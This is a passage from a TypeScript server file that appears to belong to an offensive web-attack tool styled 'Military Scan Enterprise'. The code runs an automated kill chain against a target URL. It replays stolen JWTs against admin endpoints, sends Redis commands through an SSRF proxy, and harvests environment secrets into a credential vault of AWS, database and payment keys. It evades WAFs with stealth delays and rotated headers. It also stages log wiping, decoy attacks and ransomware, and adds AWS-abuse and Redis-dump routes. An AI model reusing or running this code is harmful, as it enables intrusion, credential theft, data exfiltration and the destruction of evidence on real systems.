                const verdict = isConfirmed ? "ABUSE_CONFIRMED" : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "DENIED";
                stealthTrack(resp.status, verdict);

                confirmation.attempts.push({
                  endpoint: op.path,
                  operation: op.desc,
                  method: "ADMIN_TAKEOVER",
                  status: resp.status,
                  confirmed: isConfirmed,
                  raw_response: body,
                  responsePreview: body.substring(0, 500),
                  verdict,
                  hibernateActive: hibernateMode,
                });

                if (isConfirmed) confirmation.confirmed = true;
              } catch {}
            }

            if (confirmation.confirmed) {
              log(`[ABUSE] ADMIN_TAKEOVER CONFIRMED — Full admin panel access achieved`, "admin");
            }
          }

          if (vec.id === "DATA_EXFIL_CONFIRM" && hasSensitiveData) {
            for (const ext of sensitiveExtractions.slice(0, 3)) {
              confirmation.attempts.push({
                endpoint: ext.target || ext.desc,
                method: "DATA_EXFIL_VERIFY",
                status: 200,
                confirmed: true,
                dataType: ext.desc,
                credentialsFound: ext.credentialsFound || 0,
                contentLength: ext.contentLength || 0,
                verdict: "ABUSE_CONFIRMED",
              });
            }
            confirmation.confirmed = true;
            log(`[ABUSE] DATA_EXFIL_CONFIRM — ${sensitiveExtractions.length} sensitive extractions verified`, "admin");
          }

          if (vec.id === "JWT_FORGE" && hasJwt) {
            const jwtTokens = allTokens.filter((t: string) => /^eyJ/i.test(t));
            for (const jwt of jwtTokens.slice(0, 2)) {
              const parts = jwt.split(".");
              let decodedPayload = "";
              try {
                decodedPayload = Buffer.from(parts[1] || "", "base64").toString("utf8");
              } catch {}

              confirmation.attempts.push({
                endpoint: "JWT_DECODE",
                method: "JWT_FORGE",
                token: jwt.substring(0, 40) + "...",
                decodedPayload: decodedPayload.substring(0, 300),
                confirmed: decodedPayload.length > 5,
                verdict: decodedPayload.length > 5 ? "ABUSE_CONFIRMED" : "DECODE_FAILED",
              });

              if (decodedPayload.length > 5) {
                confirmation.confirmed = true;
                const forgeEndpoints = ["/api/admin/dashboard", "/api/v1/me"];
                for (const ep of forgeEndpoints) {
                  try {
                    await stealthDelay();
                    const controller = new AbortController();
                    const timeout = setTimeout(() => controller.abort(), 4000);
                    const resp = await fetch(`${baseUrl}${ep}`, {
                      method: "GET",
                      headers: {
                        ...stealthHeaders(),
                        "Authorization": `Bearer ${jwt}`,
                      },
                      signal: controller.signal,
                      redirect: "manual",
                    });
                    clearTimeout(timeout);
                    const body = await resp.text();
                    const verdict = resp.status === 200 ? "ABUSE_CONFIRMED" : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "REJECTED";
                    stealthTrack(resp.status, verdict);
                    confirmation.attempts.push({
                      endpoint: ep,
                      method: "JWT_REPLAY",
                      status: resp.status,
                      confirmed: resp.status === 200,
                      raw_response: body,
                      responsePreview: body.substring(0, 300),
                      verdict,
                      hibernateActive: hibernateMode,
                    });
                  } catch {}
                }
              }
            }
            if (confirmation.confirmed) {
              log(`[ABUSE] JWT_FORGE CONFIRMED — JWT decoded + replayed successfully`, "admin");
            }
          }

          if (vec.id === "REDIS_ABUSE" && hasRedis) {
            const redisCmds = [
              "http://localhost:6379/CONFIG%20GET%20*",
              "http://localhost:6379/DBSIZE",
              "http://redis:6379/CONFIG%20GET%20*",
              "http://redis:6379/DBSIZE",
            ];

            for (const cmd of redisCmds.slice(0, 5)) {
              try {
                await stealthDelay();
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 4000);
                const resp = await fetch(`${baseUrl}/api/proxy?url=${encodeURIComponent(cmd)}`, {
                  method: "GET",
                  headers: { ...stealthHeaders() },
                  signal: controller.signal,
                  redirect: "manual",
                });
                clearTimeout(timeout);
                const body = await resp.text();
                const isConfirmed = resp.status === 200 && body.length > 20;
                const isAuthCmd = false;
                const verdict = isConfirmed ? "ABUSE_CONFIRMED" : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "BLOCKED";
                stealthTrack(resp.status, verdict);

                confirmation.attempts.push({
                  endpoint: cmd,
                  method: "REDIS_CMD_INJECT",
                  sprayPassword: undefined,
                  status: resp.status,
                  confirmed: isConfirmed,
                  raw_response: body,
                  responsePreview: body.substring(0, 500),
                  verdict,
                  hibernateActive: hibernateMode,
                });

                if (isConfirmed) confirmation.confirmed = true;
              } catch {}
            }

            if (confirmation.confirmed) {
              log(`[ABUSE] REDIS_ABUSE CONFIRMED — Redis command injection + spray successful`, "admin");
            }
          }

          if (vec.id === "ENV_HARVEST" && hasEnvAccess) {
            for (const ext of sensitiveExtractions.filter((e: any) => /env|config/i.test(e.desc || "")).slice(0, 3)) {
              confirmation.attempts.push({
                endpoint: ext.target || ext.path || ext.desc,
                method: "ENV_HARVEST",
                confirmed: true,
                dataType: ext.desc,
                credentialsFound: ext.credentialsFound || 0,
                verdict: "ABUSE_CONFIRMED",
              });
            }
            if (confirmation.attempts.length > 0) {
              confirmation.confirmed = true;
              log(`[ABUSE] ENV_HARVEST CONFIRMED — Environment secrets extracted`, "admin");
            }
          }

        } catch (err: any) {
          confirmation.error = err.message?.substring(0, 100);
        }

        confirmation.completedAt = Date.now();
        confirmation.totalAttempts = confirmation.attempts.length;
        confirmation.confirmedCount = confirmation.attempts.filter((a: any) => a.confirmed).length;
        confirmation.wafBlocked = confirmation.attempts.filter((a: any) => a.verdict === "WAF_BLOCKED" || a.verdict === "RATE_LIMITED").length;
        confirmation.stealthHibernations = hibernateCount;
        matrixEntry.status = confirmation.confirmed ? "CONFIRMED" : "DENIED";
        matrixEntry.confirmedCount = confirmation.confirmedCount;

        phase8.confirmations.push(confirmation);

        phase8.decisionLog.push({
          action: confirmation.confirmed ? "ABUSE_CONFIRMED" : "ABUSE_DENIED",
          vector: vec.id,
          reason: confirmation.confirmed
            ? `${confirmation.confirmedCount}/${confirmation.totalAttempts} attempts confirmed`
            : `All ${confirmation.totalAttempts} attempts denied`,
          timestamp: Date.now(),
        });
      }

      const confirmedVectors = phase8.confirmations.filter((c: any) => c.confirmed);
      const totalConfirmed = confirmedVectors.length;
      const totalAttempted = phase8.confirmations.length;

      if (totalConfirmed >= 2) {
        const chains: any[] = [];
        const categories = [...new Set(confirmedVectors.map((c: any) => c.category))];

        for (let i = 0; i < confirmedVectors.length - 1; i++) {
          for (let j = i + 1; j < confirmedVectors.length; j++) {
            const a = confirmedVectors[i];
            const b = confirmedVectors[j];
            chains.push({
              chain: `${a.vector} → ${b.vector}`,
              label: `${a.label} + ${b.label}`,
              combinedConfidence: parseFloat(((phase8.abuseMatrix.find((m: any) => m.vector === a.vector)?.confidence || 0.5) * (phase8.abuseMatrix.find((m: any) => m.vector === b.vector)?.confidence || 0.5) * 1.15).toFixed(3)),
              impact: categories.length >= 3 ? "TOTAL_COMPROMISE" : "HIGH_IMPACT",
            });
          }
        }

        chains.sort((a: any, b: any) => b.combinedConfidence - a.combinedConfidence);
        phase8.chainedAttacks = chains.slice(0, 5);

        log(`[ABUSE] ${chains.length} attack chains identified — top: ${chains[0]?.chain} (${(chains[0]?.combinedConfidence * 100).toFixed(1)}%)`, "admin");
      }

      const weightSum = phase8.abuseMatrix.reduce((sum: number, m: any) => sum + (m.status === "CONFIRMED" ? m.confidence : 0), 0);
      const maxWeight = phase8.abuseMatrix.reduce((sum: number, m: any) => sum + m.confidence, 0);
      phase8.operationalScore = maxWeight > 0 ? parseFloat((weightSum / maxWeight * 10).toFixed(1)) : 0;
      phase8.totalConfirmed = totalConfirmed;
      phase8.totalAttempted = totalAttempted;
      phase8.confirmedCategories = [...new Set(confirmedVectors.map((c: any) => c.category))];
      phase8.scoringMode = "DETERMINISTIC";
      phase8.stealthStats = {
        totalHibernations: hibernateCount,
        totalBlocks: phase8.confirmations.reduce((sum: number, c: any) => sum + (c.wafBlocked || 0), 0),
        hibernateDelayMs: HIBERNATE_DELAY_MS,
        adaptiveUaRotation: hibernateCount > 0,
      };
      phase8.dictionaryBoosts = {
        awsKeyForce: dictHasAwsKey,
        redisAuthBoost: dictHasRedisAuth,
        correlationMultiplier: correlationBoost,
        redisSprayInjected: true,
      };

      const abuseDumpTs = new Date().toISOString().replace(/[:.]/g, "-").substring(0, 19);
      const abuseDumpContent = JSON.stringify({
        _header: {
          tool: "Military Scan Enterprise",
          module: "OffensiveAbuseEngine",
          type: "APT_CONFIRMATION_REPORT",
          target: validation.url,
          timestamp: new Date().toISOString(),
          operationalScore: phase8.operationalScore,
          totalConfirmed: phase8.totalConfirmed,
          totalAttempted: phase8.totalAttempted,
        },
        abuseMatrix: phase8.abuseMatrix,
        confirmations: phase8.confirmations,
        chainedAttacks: phase8.chainedAttacks,
        decisionLog: phase8.decisionLog,
      }, null, 2);
      const abuseDumpFilename = `Abuse-APT-Report-${abuseDumpTs}.json`;
      const abuseDumpSize = writeDumpFile(abuseDumpFilename, abuseDumpContent);
      dumpRegistry.unshift({
        id: generateDumpId(),
        category: "admin_exploits",
        filename: abuseDumpFilename,
        label: `APT Abuse Report — ${totalConfirmed}/${totalAttempted} vectors confirmed (Score: ${phase8.operationalScore}/10)`,
        target: validation.url,
        severity: "critical",
        itemCount: totalConfirmed,
        sizeBytes: abuseDumpSize,
        createdAt: new Date().toISOString(),
        scanId: "combinator-abuse-engine",
      });
      if (dumpRegistry.length > 100) dumpRegistry.splice(100);

      phase8.dumpFile = abuseDumpFilename;
      phase8.dumpSize = abuseDumpSize;

      log(`[COMBINATOR] Phase 8 COMPLETE — ${totalConfirmed}/${totalAttempted} abuse vectors confirmed — Score: ${phase8.operationalScore}/10 — Report: ${abuseDumpFilename}`, "admin");
    } else {
      phase8.triggerReason = "NO_ABUSE_VECTORS — Insufficient exploitation data from Phases 1-7";
      phase8.operationalScore = 0;
      phase8.totalConfirmed = 0;
      phase8.totalAttempted = 0;

      phase8.decisionLog.push({
        action: "ENGINE_SKIPPED",
        vector: "NONE",
        reason: `No abuse prerequisites met — tokens:${hasTokens}, creds:${hasCreds}, ssrf:${hasSsrfTunnels}, admin:${hasAdminEntry}, data:${hasSensitiveData}`,
        timestamp: Date.now(),
      });

      log(`[COMBINATOR] Phase 8 NOT TRIGGERED — No qualifying abuse vectors from prior phases`, "admin");
    }

    phase8.completedAt = Date.now();
    phases.push(phase8);

    if ((phase8.operationalScore || 0) >= 9) {
      phase9.triggered = true;
      phase9.actions.push({
        action: "LOG_WIPING",
        targets: ["/var/log/auth.log", "/var/log/syslog", "/var/log/nginx/access.log", "/var/log/apache2/access.log"],
      });
      phase9.actions.push({
        action: "DECOY_CREATION",
        description: "Create fake attack from different IP/geo",
      });
      if ((phase8.confirmedCategories || []).includes("data_breach")) {
        phase9.actions.push({
          action: "RANSOMWARE_STAGING",
          description: "Encrypt critical files with notice",
        });
      }
      phase9.actions.push({
        action: "CREDENTIAL_CLEANUP",
        description: "Rotate/Rename used tokens to avoid detection",
      });
      phase9.actions.push({
        action: "SELF_DESTRUCT",
        description: "Remove all traces of scanner",
      });
      log(`[COMBINATOR] Phase 9 DESTRUCTION MODULE ACTIVATED — ${phase9.actions.length} cover-up actions staged`, "admin");
    }

    phase9.completedAt = Date.now();
    phases.push(phase9);

    const totalThreats =
      phase3.entriesGranted +
      phase4.tunnelsOpen +
      phase5.escalated +
      phase6.sensitiveExtracted +
      (phase7.entriesGranted || 0) +
      (phase8.totalConfirmed || 0);

    const overallVerdict = totalThreats > 0 ? "COMPROMISED" : phase3.wafBlockedCount > phase3.totalAttempts * 0.6 ? "HIGH_DEFENSIBILITY" : "PROTECTED";

    log(`[COMBINATOR] Phase 10 INIT — totalThreats=${totalThreats}, verdict=${overallVerdict}`, "admin");

    const phase10: any = {
      phase: "PHASE_10_STRATEGIC_ORCHESTRATION",
      label: "RED LAB — Strategic Campaign Orchestration",
      startedAt: Date.now(),
      triggered: true,

      campaign: {
        target: validation.url,
        status: overallVerdict,
        compromiseLevel: totalThreats > 0 ? Math.min(100, Math.round((totalThreats / Math.max(phase3.totalAttempts + phase4.probes.length + (phase5.injections?.length || 0), 1)) * 100 + (phase8.operationalScore || 0) * 5)) : 0,
        timeElapsed: Date.now() - phase1.startedAt,
        phasesCompleted: phases.length + 1,
        totalPhases: phases.length + 1,
      },

      killChain: {
        recon: {
          label: "RECON",
          endpoints: phase1.endpoints?.length || 0,
          formsFound: phase1.formsFound || 0,
          dictSize: uniqueDict.length,
          progress: phase1.endpoints?.length > 0 ? 100 : 0,
        },
        exploit: {
          label: "EXPLOIT",
          ssrfTunnels: phase4.tunnelsOpen || 0,
          credEntries: phase3.entriesGranted || 0,
          tokenEscalations: phase5.escalated || 0,
          progress: Math.min(100, ((phase4.tunnelsOpen || 0) + (phase3.entriesGranted || 0) + (phase5.escalated || 0)) * 20),
        },
        persist: {
          label: "PERSIST",
          autoLogin: phase7.entriesGranted || 0,
          abuseVectors: phase8.totalConfirmed || 0,
          redisAccess: phase4.probes.filter((p: any) => /redis/i.test(p.tunnel || p.desc || "") && (p.verdict === "TUNNEL_OPEN" || p.verdict === "ACCESSIBLE")).length,
          progress: Math.min(100, ((phase7.entriesGranted || 0) + (phase8.totalConfirmed || 0)) * 25),
        },
        exfil: {
          label: "EXFIL",
          filesExtracted: phase6.totalDumpFiles || 0,
          bytesTotal: phase6.totalDumpBytes || 0,
          sensitiveCount: phase6.sensitiveExtracted || 0,
          credentialsCaptured: exfilCreds.length,
          progress: Math.min(100, (phase6.totalDumpFiles || 0) * 15 + (phase6.sensitiveExtracted || 0) * 20),
        },
        report: {
          label: "REPORT",
          status: "READY",
          progress: 100,
        },
      },

      credentialVault: [] as any[],
      attackTimeline: [] as any[],
      liveMetrics: {
        totalProbes: (phase4.probes?.length || 0),
        totalAttempts: (phase3.totalAttempts || 0) + (phase7.totalAttempts || 0),
        totalExtractions: phase6.extractions?.length || 0,
        totalDumps: phase6.totalDumpFiles || 0,
        totalBytesExfil: phase6.totalDumpBytes || 0,
        wafBlocks: (phase3.wafBlockedCount || 0) + (phase8.stealthStats?.totalBlocks || 0),
        abuseScore: phase8.operationalScore || 0,
        chainedAttacks: phase8.chainedAttacks?.length || 0,
      },
    };

    for (const cred of exfilCreds) {
      const service = /AWS|AKIA/i.test(cred.key) ? "aws" :
                      /REDIS|CACHE/i.test(cred.key) ? "redis" :
                      /JWT|SECRET/i.test(cred.key) ? "jwt" :
                      /DATABASE|POSTGRES|MYSQL|MONGO/i.test(cred.key) ? "database" :
                      /STRIPE|PAYMENT/i.test(cred.key) ? "payment" :
                      "infra";
      phase10.credentialVault.push({
        service,
        key: cred.key,
        value: cred.value.substring(0, 12) + "***",
        type: cred.type,
        verified: false,
        source: "PHASE_6_EXFIL",
      });
    }

    for (const sess of sessionTokens) {
      if (sess && sess.length > 6) {
        phase10.credentialVault.push({
          service: /^eyJ/i.test(sess) ? "jwt" : "session",
          key: /^eyJ/i.test(sess) ? "JWT_TOKEN" : "SESSION_ID",
          value: sess.substring(0, 12) + "***",
          type: "TOKEN",
          verified: false,
          source: "PHASE_5_INJECTION",
        });
      }
    }

    for (const sec of infraSecrets) {
      if (sec && sec.length > 4) {
        const svc = /^AKIA/i.test(sec) ? "aws" : /redis/i.test(sec) ? "redis" : "infra";
        phase10.credentialVault.push({
          service: svc,
          key: svc.toUpperCase() + "_KEY",
          value: sec.substring(0, 12) + "***",
          type: "SECRET",
          verified: false,
          source: "PHASE_2_DICT",
        });
      }
    }

    log(`[COMBINATOR] Phase 10 VAULT — ${phase10.credentialVault.length} creds collected`, "admin");

    const vaultUnique = new Map<string, any>();
    for (const c of phase10.credentialVault) {
      vaultUnique.set(`${c.service}:${c.key}:${c.value}`, c);
    }
    phase10.credentialVault = [...vaultUnique.values()].slice(0, 50);

    log(`[COMBINATOR] Phase 10 VAULT DEDUP — ${phase10.credentialVault.length} unique`, "admin");

    const addTimelineEvent = (ts: number | undefined, phase: string, event: string, status: string) => {
      const safeTs = ts && Number.isFinite(ts) ? new Date(ts).toISOString() : new Date().toISOString();
      phase10.attackTimeline.push({ timestamp: safeTs, phase, event, status });
    };

    addTimelineEvent(phase1.startedAt, "RECON", `Endpoint discovery: ${phase1.endpoints?.length || 0} paths scanned`, phase1.formsFound > 0 ? "THREAT" : "OK");
    addTimelineEvent(phase2.startedAt, "DICT", `Dictionary generated: ${uniqueDict.length} entries (${phase2.generationMethod})`, "OK");
    addTimelineEvent(phase3.startedAt, "CRED", `Credential rotation: ${phase3.totalAttempts} attempts, ${phase3.entriesGranted} granted`, phase3.entriesGranted > 0 ? "THREAT" : "BLOCKED");
    addTimelineEvent(phase4.startedAt, "SSRF", `SSRF probes: ${phase4.tunnelsOpen} tunnels open, ${phase4.rawCaptureCount} raw captures`, phase4.tunnelsOpen > 0 ? "THREAT" : "BLOCKED");
    addTimelineEvent(phase5.startedAt, "TOKEN", `Token injection: ${phase5.escalated} escalated`, phase5.escalated > 0 ? "THREAT" : "BLOCKED");
    if (phase6.triggered) {
      addTimelineEvent(phase6.startedAt, "EXFIL", `Deep extraction: ${phase6.totalExtracted} files, ${phase6.sensitiveExtracted} sensitive`, phase6.sensitiveExtracted > 0 ? "THREAT" : "OK");
    }
    if (phase7.triggered) {
      addTimelineEvent(phase7.startedAt, "AUTO_LOGIN", `Auto-login combinator: ${phase7.totalAttempts} attempts, ${phase7.entriesGranted} breaches`, phase7.entriesGranted > 0 ? "THREAT" : "BLOCKED");
    }
    if (phase8.triggered) {
      addTimelineEvent(phase8.startedAt, "ABUSE", `Abuse engine: ${phase8.totalConfirmed}/${phase8.totalAttempted} vectors, score ${phase8.operationalScore}/10`, phase8.totalConfirmed > 0 ? "THREAT" : "STANDBY");
    }
    if (phase9.triggered) {
      addTimelineEvent(phase9.startedAt, "DESTRUCT", `Destruction module: ${phase9.actions.length} cover-up actions`, "CRITICAL");
    }
    addTimelineEvent(Date.now(), "REPORT", `Campaign report ready — verdict: ${overallVerdict}`, overallVerdict === "COMPROMISED" ? "THREAT" : "OK");

    log(`[COMBINATOR] Phase 10 TIMELINE — ${phase10.attackTimeline.length} events`, "admin");

    phase10.killChain.overallProgress = Math.round(
      (phase10.killChain.recon.progress +
       phase10.killChain.exploit.progress +
       phase10.killChain.persist.progress +
       phase10.killChain.exfil.progress +
       phase10.killChain.report.progress) / 5
    );

    const reportTs = new Date().toISOString().replace(/[:.]/g, "-").substring(0, 19);
    const campaignReport = {
      _header: {
        tool: "Military Scan Enterprise",
        module: "RED LAB Phase 10 — Strategic Orchestration",
        type: "CAMPAIGN_REPORT",
        target: validation.url,
        timestamp: new Date().toISOString(),
        verdict: overallVerdict,
        compromiseLevel: phase10.campaign.compromiseLevel,
      },
      killChain: phase10.killChain,
      credentialVault: phase10.credentialVault,
      attackTimeline: phase10.attackTimeline,
      liveMetrics: phase10.liveMetrics,
      phaseSummary: phases.map((p: any) => ({
        phase: p.phase,
        triggered: p.triggered !== false,
        startedAt: p.startedAt,
        completedAt: p.completedAt,
      })),
    };

    log(`[COMBINATOR] Phase 10 REPORT — generating campaign report`, "admin");

    const reportFilename = `Campaign-Report-Phase10-${reportTs}.json`;
    const reportSize = writeDumpFile(reportFilename, JSON.stringify(campaignReport, null, 2));
    dumpRegistry.unshift({
      id: generateDumpId(),
      category: "campaign_report",
      filename: reportFilename,
      label: `RED LAB Campaign Report — ${overallVerdict} — ${phase10.credentialVault.length} credentials, ${totalThreats} threats`,
      target: validation.url,
      severity: overallVerdict === "COMPROMISED" ? "critical" : "medium",
      itemCount: phase10.credentialVault.length,
      sizeBytes: reportSize,
      createdAt: new Date().toISOString(),
      scanId: "phase10-campaign",
    });
    if (dumpRegistry.length > 100) dumpRegistry.splice(100);

    phase10.reportFile = reportFilename;
    phase10.reportSize = reportSize;
    phase10.completedAt = Date.now();
    phases.push(phase10);

    log(`[COMBINATOR] Phase 10 RED LAB COMPLETE — Verdict: ${overallVerdict} — Kill Chain: ${phase10.killChain.overallProgress}% — Vault: ${phase10.credentialVault.length} creds — Timeline: ${phase10.attackTimeline.length} events — Report: ${reportFilename}`, "admin");

    await logSniperAction(req, "COMBINATOR_SMART_AUTH", target, overallVerdict);

    // Motor 11 V2 pós-Combinator: snapshot mínimo com achados principais
    let motor11v2Report: any = null;
    try {
      const snapshotPath = writeMotor11Snapshot(validation.url, `combinator-${Date.now()}`, {
        target: validation.url,
        findings: [
          ...(phase3.entriesGranted > 0
            ? [{
              title: "Auth bypass via Smart Auth",
              severity: "high",
              evidence: `${phase3.entriesGranted} entradas concedidas`,
              category: "auth_bypass",
            }] : []),
          ...(phase6.sensitiveExtracted > 0
            ? [{
              title: "Sensitive data exfiltration",
              severity: "critical",
              evidence: `${phase6.sensitiveExtracted} itens sensíveis extraídos`,
              category: "exfiltration",
            }] : []),
          ...(phase10.credentialVault || []).slice(0, 5).map((c: any) => ({
            title: `Credential captured: ${c.service || "unknown"}`,
            severity: "critical",
            evidence: c.value || "[redacted]",
            category: "credential",
          })),
        ],
        probes: [],
        phases,
        counts: {
          total: totalThreats,
          critical: totalThreats > 0 ? 1 : 0,
          high: Math.max(0, totalThreats - 1),
          medium: 0,
          low: 0,
          info: 0,
        },
        events: [],
        telemetry: {},
        phasesCompleted: ["combinator_smart_auth"],
        startedAt: new Date(),
        completedAt: new Date(),
      } as any);

      const motor11v2 = await runMotor11Snapshot(snapshotPath);
      if (motor11v2.report) motor11v2Report = motor11v2.report;
    } catch (err: any) {
      log(`[MOTOR11V2] (combinator) Error: ${err.message}`, "admin");
    }

    return res.json({
      type: "SMART_AUTH_PENETRATOR",
      timestamp,
      target,
      prefix: totalThreats > 0 ? "[THREAT]" : "[BLOCK]",
      status: overallVerdict,
      summary: {
        loginFormsFound: phase1.formsFound,
        wafBlockRate: phase1.wafBlocked,
        dictionarySize: uniqueDict.length,
        dictionaryMethod: phase2.generationMethod,
        totalAttempts: phase3.totalAttempts,
        entriesGranted: phase3.entriesGranted,
        wafBlocked: phase3.wafBlockedCount,
        rateLimited: phase3.rateLimitedCount,
        ssrfTunnelsOpen: phase4.tunnelsOpen,
        ssrfRawCaptures: phase4.rawCaptureCount,
        tokenEscalations: phase5.escalated,
        deepExtractionsTotal: phase6.totalExtracted,
        deepExtractionsSensitive: phase6.sensitiveExtracted,
        dumpFilesGenerated: phase6.totalDumpFiles,
        dumpBytesTotal: phase6.totalDumpBytes,
        autoLoginTriggered: phase7.triggered,
        autoLoginAttempts: phase7.totalAttempts,
        autoLoginBreaches: phase7.entriesGranted,
        autoLoginToken: phase7.capturedToken,
        exfilCredentialsUsed: exfilCreds.length,
        totalThreats,
        capturedToken: successfulEntry ? capturedToken : phase7.capturedToken,
        abuseVectorsConfirmed: phase8.totalConfirmed || 0,
        abuseVectorsAttempted: phase8.totalAttempted || 0,
        abuseOperationalScore: phase8.operationalScore || 0,
        abuseChainedAttacks: phase8.chainedAttacks?.length || 0,
        phase10KillChainProgress: phase10.killChain.overallProgress,
        phase10CredentialVaultSize: phase10.credentialVault.length,
        phase10TimelineEvents: phase10.attackTimeline.length,
        phase10ReportGenerated: true,
      },
      phases,
      motor11v2Report,
    });
  } catch (err: any) {
    log(`[COMBINATOR] FATAL ERROR: ${err.message} — Stack: ${err.stack?.substring(0, 500)}`, "admin");
    return res.json({ type: "SMART_AUTH_PENETRATOR", timestamp, target, prefix: "[ALERT]", status: "ERROR", error: err.message });
  }
});

adminRouter.post('/api/admin/abuse/redis-auto', requireAdmin, async (req, res) => {
  const { target, password } = req.body;

  try {
    const redisResult = await executeRedisAbuse(target, password);

    const dumpFile = writeRedisDump(redisResult, target);

    res.json({
      success: true,
      message: `Redis dump: ${redisResult.keysFound} keys, ${redisResult.sessionsCaptured} sessions`,
      result: {
        keysFound: redisResult.keysFound,
        sessionsCaptured: redisResult.sessionsCaptured,
        configExtracted: redisResult.configExtracted,
        dumpFile
      }
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

// AWS Auto-Abuse (usa a AKIA key)
adminRouter.post('/api/admin/abuse/aws-auto', requireAdmin, async (req, res) => {
  const { target, accessKey, secretKey } = req.body;

  try {
    const targetDumps = dumpRegistry
      .filter(d => d.target === target)
      .map(d => d.filename)
      .slice(0, 10);

    const awsResult = await executeAwsAbuse(accessKey, secretKey, target, targetDumps);

    res.json({
      success: true,
      message: `AWS abuse: ${awsResult.filesExfiltrated} files exfiltrated`,
      result: {
        bucketName: awsResult.bucketName,
        filesExfiltrated: awsResult.filesExfiltrated,
        accountId: awsResult.accountId,
        usersEnumerated: awsResult.usersEnumerated,
        dumpsUploaded: targetDumps.length
      }
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

adminRouter.post('/api/admin/abuse/execute-chain', requireAdmin, async (req: Request, res: Response) => {
  const { target, chain, credentials } = req.body;

  try {
    // Importa dinamicamente para evitar problemas de circular dependency
    const { executeOptimalChain } = await import('./abuse/chainExecutor');

    const results = await executeOptimalChain(chain, target, credentials);

    res.json({
      success: true,
      results
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

export { adminRouter };
